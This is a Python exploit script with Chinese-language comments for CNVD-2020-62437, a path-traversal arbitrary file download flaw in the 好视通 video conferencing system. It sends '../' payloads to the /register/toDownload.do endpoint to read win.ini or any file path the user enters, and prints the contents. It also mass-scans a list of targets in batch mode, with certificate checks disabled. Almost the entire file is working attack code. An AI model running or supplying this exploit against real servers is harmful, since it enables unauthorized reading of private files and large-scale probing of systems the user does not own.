'''
Author: your name
Date: 2021-04-10 01:47:59
LastEditTime: 2021-04-10 02:08:25
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \好视通视频会议系统\好视通视频会议系统任意文件下载.py
'''
import time
import requests
import os
from requests.sessions import session
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse

class poc():
    def title(self):
        print('''
+-----------------------------------------------------------------+
漏洞名称:CNVD-2020-62437 好视通视频会议系统任意文件下载  
功能：单个检测，批量检测                                     
单个检测：python poc.py -u url
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+                                     
''')
    #漏洞检测
    def exp(self, target_url):
        url = f'{target_url}/register/toDownload.do?fileName='
        payload=input('请输入读取文件的路径,默认请回车：') or '../../../../../../../../../../../windows/win.ini'
        url=url+payload
        print(f'完整payload: {url}')
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = requests.get(url=url,
                                headers=headers,
                                verify=False,
                                timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    def poc(self, target_ur):
        url = f'{target_ur}/register/toDownload.do?fileName=../resources/commonImage/header_logo.png'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = requests.get(url=url,
                                headers=headers,
                                verify=False,
                                timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
            
    def main(self, target_url, file):
        self.title()
        count=0
        if target_url:
            res=self.exp(target_url)
            if res.status_code==200:
                print(res.text)
                print(f'\033[31m[+] 文件内容：\n{res.text}\033[0m')
        if file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                time.sleep(1)
                res=self.poc(target_url)
                if res.status_code==200:
                    print(f'\033[31m[{count}] 响应值为200，{target_url} 可能存在漏洞\033[0m')
                else:
                    print(f'[{count}] 响应值为{res.status_code}，{target_url} 不存在漏洞')
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="目标地址，带上http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="批量检测，带上http://")
    args = parser.parse_args()
    run = poc()
    run.main(args.url, args.file)
